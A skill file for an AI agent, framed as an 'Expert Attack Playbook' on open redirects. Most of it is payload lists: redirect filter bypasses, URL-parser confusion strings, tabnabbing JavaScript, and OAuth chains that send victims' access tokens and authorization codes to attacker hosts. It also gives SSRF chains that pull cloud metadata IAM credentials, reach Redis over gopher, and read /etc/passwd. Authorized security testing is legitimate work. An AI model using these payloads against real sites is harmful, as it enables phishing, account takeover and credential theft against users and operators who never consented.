---
name: open-redirect
description: >-
  Open redirect playbook. Use when URL parameters, form actions, or JavaScript sinks control navigation targets and may redirect users to attacker-controlled destinations.
---

# SKILL: Open Redirect — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Open redirect techniques. Covers parameter-based redirects, JavaScript sinks, filter bypass, and chaining with phishing, CSRF Referer bypass, OAuth token theft, and SSRF. Often underrated but critical for phishing and as a building block in multi-step exploit chains.

## 1. CORE CONCEPT

Open redirect occurs when an application redirects users to a URL derived from user input without validation. The trusted domain acts as a "launchpad" for phishing or token theft.

```
https://trusted.com/redirect?url=https://evil.com
→ User sees trusted.com in the link → clicks → lands on evil.com
```

---

## 2. FINDING REDIRECT PARAMETERS

### Common Parameter Names

```text
?url=           ?redirect=      ?next=          ?dest=
?destination=   ?redir=         ?return=        ?returnUrl=
?go=            ?forward=       ?target=        ?out=
?continue=      ?link=          ?view=          ?to=
?ref=           ?callback=      ?path=          ?rurl=
```

### Server-Side Sinks

```
HTTP 301/302 Location header
PHP: header("Location: $input")
Python: redirect(input)
Java: response.sendRedirect(input)
Node: res.redirect(input)
```

### Client-Side (JavaScript) Sinks

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

---

## 3. FILTER BYPASS TECHNIQUES

| Validation | Bypass |
|---|---|
| Checks if URL starts with `/` | `//evil.com` (protocol-relative) |
| Checks domain contains `trusted.com` | `evil.com?trusted.com` or `trusted.com.evil.com` |
| Blocks `http://` | `//evil.com`, `https://evil.com`, `\/\/evil.com` |
| Checks URL starts with `https://trusted.com` | `https://trusted.com@evil.com` (userinfo) |
| Regex `^/[^/]` (relative only) | `/\evil.com` (backslash treated as path in some browsers) |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` — URL path ends with target domain |
| Whitelist by domain suffix | Subdomain takeover on `*.trusted.com` |

```text
# Protocol-relative:
//evil.com

# Userinfo bypass:
https://trusted.com@evil.com

# Backslash trick:
/\evil.com
/\/evil.com

# URL encoding:
https://trusted.com/%2F%2Fevil.com

# Django endswith bypass:
http://evil.com/www.target.com
http://evil.com?target.com

# Trusted site double-redirect (e.g., via Baidu link service):
https://link.target.com/?url=http://evil.com

# Special character confusion:
http://evil.com#@trusted.com        # fragment as authority
http://evil.com?trusted.com         # query string confusion
http://trusted.com%00@evil.com      # null byte truncation

# Tab/newline in URL (browser ignores whitespace):
java%09script:alert(1)
```

---

## 4. EXPLOITATION CHAINS

### Phishing Amplification

Attacker sends: `https://bigbank.com/redirect?url=https://bigbank-login.evil.com`
Victim sees `bigbank.com` → clicks → enters credentials on clone site.

### OAuth Token Theft

If OAuth `redirect_uri` allows open redirect on the authorized domain:
```
/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com
→ Authorization code or token appended to evil.com URL
→ Attacker captures token from URL fragment or query
```

### CSRF Referer Bypass

Some CSRF protections check `Referer` header contains trusted domain:
```
1. Attacker page links to: https://trusted.com/redirect?url=https://trusted.com/change-email
2. Redirect preserves Referer from trusted.com
3. CSRF protection passes because Referer = trusted.com
```

### SSRF via Redirect

When server follows redirects:
```
?url=https://attacker.com/redirect-to-internal
# attacker.com returns 302 → http://169.254.169.254/
# Server follows redirect → SSRF to metadata endpoint
```

---

## 5. TESTING CHECKLIST

```
□ Identify all URL parameters that trigger redirects
□ Test external domain: ?url=https://evil.com
□ Test protocol-relative: ?url=//evil.com
□ Test userinfo bypass: ?url=https://trusted.com@evil.com
□ Test backslash: ?url=/\evil.com
□ Test JavaScript sink: ?url=javascript:alert(1) (DOM-based)
□ Check OAuth flows for redirect_uri open redirect
□ Verify if redirect preserves auth tokens in URL
```

---

## 6. TABNABBING (REVERSE TABNABBING)

### Concept

When a link opens a new tab with `target="_blank"` WITHOUT `rel="noopener"`:

- The new page can access `window.opener`
- It can redirect the ORIGINAL page: `window.opener.location = "https://phishing.com/login"`
- User returns to "original" tab → sees fake login page → enters credentials

### Detection

```html
<!-- Vulnerable: -->
<a href="https://external.com" target="_blank">Click here</a>

<!-- Safe: -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click here</a>
```

### Exploitation

```javascript
// On the attacker-controlled page (opened via target="_blank"):
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

### Where to Look

- User-generated content with links (forums, comments, profiles)
- `target="_blank"` links to external domains
- PDF viewers, document previews opening in new tabs

---

## 7. OPEN REDIRECT → OAUTH TOKEN THEFT (DETAILED CHAINS)

### 7.1 OAuth Implicit Flow

In the implicit flow, the access token is returned in the URL fragment (`#access_token=...`). If `redirect_uri` allows an open redirect on the authorized domain:

```text
/authorize?response_type=token
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback/../redirect?url=https://evil.com
  &scope=read

Flow:
1. User authenticates → authorization server redirects to:
   https://target.com/redirect?url=https://evil.com#access_token=SECRET
2. Open redirect fires → browser navigates to:
   https://evil.com#access_token=SECRET
3. Attacker page reads location.hash → captures access token
```

### 7.2 Authorization Code Flow

The authorization code is sent as a query parameter. If the redirect chain preserves query parameters:

```text
/authorize?response_type=code
  &client_id=CLIENT
  &redirect_uri=https://target.com/callback%2f..%2fredirect%3furl%3dhttps://evil.com

Flow:
1. Authorization server validates redirect_uri prefix → matches https://target.com/
2. Redirects to: https://target.com/redirect?url=https://evil.com&code=AUTH_CODE
3. Open redirect sends victim to: https://evil.com?code=AUTH_CODE
4. Attacker exchanges code for access token
```

### 7.3 OIDC id_token Fragment Leak

```text
/authorize?response_type=id_token
  &client_id=CLIENT
  &redirect_uri=https://target.com/cb
  &nonce=NONCE

If redirect_uri points to open redirect endpoint:
→ id_token in fragment sent to attacker
→ Attacker has signed identity assertion
→ Can authenticate as victim on any RP accepting this IdP
```

### 7.4 redirect_uri validation bypass patterns

```text
redirect_uri=https://target.com/callback/../open-redirect?url=evil.com
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback/../../redirect
redirect_uri=https://target.com/callback#@evil.com
```

---

## 8. OPEN REDIRECT → SSRF CHAIN

### Server-side redirect following

When a server-side component follows HTTP redirects (e.g., URL preview, link unfurler, webhook, image fetcher):

```text
1. Submit URL to server-side fetcher: http://attacker.com/redirect
2. attacker.com responds: 302 Location: http://169.254.169.254/latest/meta-data/
3. Server follows redirect → SSRF to cloud metadata endpoint
4. Response (IAM credentials) returned to attacker or visible in preview
```

### Multi-hop redirect for filter bypass

```text
1. Server blocks direct requests to 169.254.169.254
2. Submit: http://attacker.com/r1
3. r1 → 302 → http://attacker.com/r2  (same domain, passes filter)
4. r2 → 302 → http://169.254.169.254/ (internal, filter not re-checked)
```

### DNS rebinding variant

```text
1. attacker.com resolves to attacker's public IP (TTL=0)
2. Server resolves attacker.com → public IP → passes SSRF filter
3. Connection established, but HTTP redirect points to attacker.com again
4. Second DNS resolution: attacker.com now resolves to 169.254.169.254
5. Server follows redirect to internal address
```

### Scope escalation via redirect protocols

```text
http://attacker.com/redirect → gopher://127.0.0.1:6379/...  (Redis SSRF)
http://attacker.com/redirect → file:///etc/passwd            (local file read)
http://attacker.com/redirect → dict://127.0.0.1:11211/       (Memcached)
```

Not all HTTP clients follow cross-protocol redirects, but `curl` (default) and some libraries do.

---

## 9. URL PARSER CONFUSION FOR REDIRECT BYPASS

When a redirect validation function parses the URL differently from the browser or server that ultimately processes it:

### Protocol-relative URL

```text
//attacker.com
→ Browser: https://attacker.com (inherits current page protocol)
→ Some validators: relative path "/attacker.com" (wrong)
```

### Backslash confusion

```text
\/\/attacker.com
/\/attacker.com
→ Many browsers normalize \ to / in URLs
→ Validators treating \ as path character may allow it
```

### Userinfo section abuse

```text
//attacker.com\@target.com
→ Browser: navigates to attacker.com (@ is userinfo delimiter)
→ Validator sees "target.com" in the string → passes allowlist check

//target.com@attacker.com
→ Browser: userinfo=target.com, host=attacker.com
→ Validator checks "starts with target.com" → passes

https://target.com%2F@attacker.com
→ URL-decoded: target.com/ as userinfo, host=attacker.com
```

### Double encoding

```text
//attacker%252ecom
→ First decode: //attacker%2ecom (passes validator)
→ Second decode (by server/browser): //attacker.com (actual redirect)
```

### CRLF injection + redirect

```text
/%0d%0aLocation:%20https://attacker.com
→ If server reflects the path in a header context:
   HTTP/1.1 302 Found
   Location: /
   Location: https://attacker.com  ← injected header wins
```

### Fragment confusion

```text
https://target.com#@attacker.com
→ Browser: host=target.com, fragment=@attacker.com
→ But some JS-based redirects: window.location = url → may process differently

https://attacker.com#.target.com
→ Validator: sees "target.com" in string → passes
→ Browser: navigates to attacker.com (fragment ignored in navigation)
```

### Special characters

```text
https://attacker.com%E3%80%82target.com
→ Unicode ideographic full stop (U+3002) — some parsers treat as dot
→ Browser may normalize differently than validator

https://attacker。com    (U+3002 fullwidth period)
https://attacker．com    (U+FF0E fullwidth full stop)
```

### Combined URL parser differential table

| Payload | Validator Sees | Browser Navigates To |
|---------|---------------|---------------------|
| `//evil.com` | Relative path | `https://evil.com` |
| `\/\/evil.com` | Path `\/\/evil.com` | `https://evil.com` |
| `//evil.com\@target.com` | Contains `target.com` | `https://evil.com` |
| `//target.com@evil.com` | Starts with `target.com` | `https://evil.com` |
| `/%0d%0aLocation: https://evil.com` | Path string | Header injection → redirect |
| `//evil%252ecom` | `evil%2ecom` (not a domain) | `evil.com` (after double decode) |
